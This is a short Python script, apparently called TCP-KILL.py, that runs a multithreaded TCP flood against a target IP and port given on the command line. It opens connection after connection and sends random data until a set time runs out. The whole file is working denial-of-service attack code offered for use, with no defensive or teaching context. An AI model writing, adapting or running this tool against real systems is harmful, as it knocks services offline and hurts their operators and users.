import socket
import time
import random
import threading
from sys import argv

def tcp_flood(ip, port, flood_time, packet_size):
    while time.time() < flood_time:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((ip, port))
            data = random._urandom(packet_size)
            sock.send(data)

def main():
    if len(argv) < 6:
        print("Usage: python3 TCP-KILL.py [IP] [PORT] [FLOOD_TIME] [PACKET_SIZE] [NUM_THREADS]")
        exit(1)

    threads = []
    ip = str(argv[1])
    port = int(argv[2])
    flood_time = time.time() + int(argv[3])
    packet_size = int(argv[4])
    num_threads = int(argv[5])

    for _ in range(num_threads):
        thread = threading.Thread(target=tcp_flood, args=(ip, port, flood_time, packet_size))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
